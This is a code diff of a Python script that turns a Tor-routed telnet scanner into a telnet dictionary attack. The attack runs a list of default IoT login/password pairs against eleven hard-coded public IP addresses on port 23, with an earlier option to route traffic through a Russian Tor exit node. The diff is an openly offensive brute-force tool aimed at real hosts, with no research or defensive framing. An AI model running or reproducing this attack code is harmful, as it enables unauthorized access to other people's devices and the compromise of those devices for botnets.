@@ -9,54 +9,9 @@ import traceback
 import time
 from simpleTelnetScan.torManager import TorManager
 from simpleTelnetScan.serviceScanner import ServiceScanner
+from simpleTelnetScan import telnetDictionaryAttack
 
-if __name__ == '__main__':
-    logger = logging.getLogger()
-    logger.setLevel(logging.DEBUG)
-    
-    handler = logging.StreamHandler()
-    handler.setLevel(logging.DEBUG)
-    formatter = logging.Formatter("%(asctime)s %(threadName)s %(levelname)s %(filename)s %(funcName)s: %(message)s")
-    handler.setFormatter(formatter)
-    logger.addHandler(handler)
-    
-    handler = logging.FileHandler("scan.log","a", encoding=None, delay="true")
-    handler.setLevel(logging.INFO)
-    handler.setFormatter(formatter)
-    logger.addHandler(handler)
-    
-    logger.info('Start app.')
-    
-    try :
-               
-        logger.debug('Start tor')
-        torManager = TorManager('7000','ru')
-        torManager.connect() 
-        
-        logger.debug('Init scanner')
-        serviceScan = ServiceScanner(23,3,1000)
-        
-        logger.debug('Start scanner')
-        serviceScan.startScan()
-        logger.debug('Scanner started')
-        
-    except:
-        logging.getLogger().error("Error occurs : " + traceback.format_exc())
-    
-    finally:
-        time.sleep(100)
-        
-        serviceScan.stopScan()
-        
-        time.sleep(1)
-        torManager.disconnect()
-        
-        logger.info('Quit app.')
-        
-        
-        
-def getLoginPasswords():
-    return [
+loginPasswords =[
         ("root","xc3511"),
         ("root","vizxv"),
         ("root","admin"),
@@ -119,3 +74,50 @@ def getLoginPasswords():
         ("admin","meinsm"),
         ("tech","tech"),
         ("mother","fucker")]
+
+if __name__ == '__main__':
+    logger = logging.getLogger()
+    logger.setLevel(logging.DEBUG)
+    
+    handler = logging.StreamHandler()
+    handler.setLevel(logging.DEBUG)
+    formatter = logging.Formatter("%(asctime)s %(threadName)s %(levelname)s %(filename)s %(funcName)s: %(message)s")
+    handler.setFormatter(formatter)
+    logger.addHandler(handler)
+    
+    handler = logging.FileHandler("attack.log","a", encoding=None, delay="true")
+    handler.setLevel(logging.INFO)
+    handler.setFormatter(formatter)
+    logger.addHandler(handler)
+    
+    logger.info('Start app.')
+    
+    try :
+               
+        """logger.debug('Start tor')
+        torManager = TorManager('7000','ru') #choose exit node in russia
+        torManager.connect() """
+        
+        
+        logger.debug('Init attack')
+        serviceAttack = telnetDictionaryAttack.TelnetDictionaryAttack(loginPasswords , ["185.97.162.12:23","5.206.211.123:23","92.81.49.221:23","186.117.116.87:23","183.88.9.138:23","201.56.23.1:23","218.207.8.26:23","79.134.150.80:23","146.255.238.19:23","140.136.25.90:23","64.92.6.251:23"] , 3)
+        
+        logger.debug('Start attack')
+        serviceAttack.startAttack()
+        logger.debug('Attack started')
+        
+    except:
+        logger.error("Error occurs : " + traceback.format_exc())
+    
+    finally:
+        time.sleep(10)
+        
+        serviceAttack.stopAttack()
+        
+        """time.sleep(1)
+        torManager.disconnect()"""
+        
+        logger.info('Quit app.')
+        
+        
+        
